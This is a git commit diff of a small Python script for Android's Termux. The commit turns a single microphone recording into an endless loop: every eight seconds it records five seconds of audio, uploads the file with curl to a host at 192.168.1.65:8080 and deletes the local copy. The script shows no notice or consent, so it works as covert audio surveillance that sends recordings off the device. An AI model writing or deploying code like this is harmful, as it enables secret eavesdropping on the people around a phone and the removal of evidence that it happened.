25d161c9e416cffd6741b2eab3e065aac3b76158
Ivan <138053343+apexory@users.noreply.github.com>
2024-02-25 11:10:07 +0300

    Update a.py

--- a.py
+++ a.py
@@ -1,8 +1,16 @@
-import os, time
+import os, time, threading
 
-# Записывание микрофона в аудиофайл (audio.wav) (5 с)
-os.system('termux-microphone-record -f audio.wav -l 5')
-time.sleep(6)
+def setInterval(func,time):
+    e = threading.Event()
+    while not e.wait(time):
+        func()
 
-print('Готово!')
-os.system('ls')
+def rec():
+  # Записывание микрофона в аудиофайл (audio.wav) (5 с)
+  os.system('termux-microphone-record -f audio.wav -l 5')
+  time.sleep(6)
+
+  os.system('curl -X POST -F "file=@audio.wav" http://192.168.1.65:8080')
+  os.system('rm audio.wav')
+
+setInterval(rec, 8)
